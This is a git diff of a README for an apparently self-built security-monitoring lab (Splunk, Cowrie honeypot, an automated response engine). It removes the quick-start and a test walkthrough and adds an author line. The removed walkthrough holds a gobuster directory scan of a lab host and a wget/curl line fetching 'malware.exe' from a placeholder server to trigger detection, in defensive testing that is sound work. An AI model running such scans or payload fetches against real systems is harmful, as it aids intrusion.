@@ -202,46 +202,10 @@ input(type="imudp" port="514")
 
 ---
 
-## 6 – Deployment (Quick‑Start)
-
-```bash
-# 1. Clone repo & cd
-# 2. Bring up Splunk
-cd docker && docker compose -f splunk-compose.yml up -d
-# 3. Populate .env on mini‑soar (Telegram, VT, AbuseIPDB, HEC creds)
-# 4. pip install -r requirements.txt
-# 5. Run SOAR engine
-python3 soar.py  # inside mini‑soar VM
-```
-
-> **Tip :** All VMs are bridged on `192.168.56.0/24`; adjust IPs if you use a different VirtualBox network.
-
----
-
-## 7 – TL;DR Scenario Walk‑Through
-
-1. **Web recon** – on **attackervm** run:
-
-   ```bash
-   ```
-
-gobuster dir -u http://192.168.56.110 -w /usr/share/wordlists/dirb/common.txt
-
-````
-   *Expected* : Splunk alert → SOAR blocks IP via iptables → Telegram “blocked” message.
-2. **Honeypot login** – `ssh root@192.168.56.109` (Cowrie). Observe alert‑only flow.
-3. **Malware fetch** – inside Cowrie session run:
-   ```bash
-wget/curl http://SERVER_IP:PORT/malware.exe
-````
-
-*Expected* : SOAR uploads file to VirusTotal, Telegram report, enriched event in `soar_actions`.
-
-
----
-
 ## License
 
 MIT — see `LICENSE` file.
 
 ---
+
+Author: Ben Yakoubov
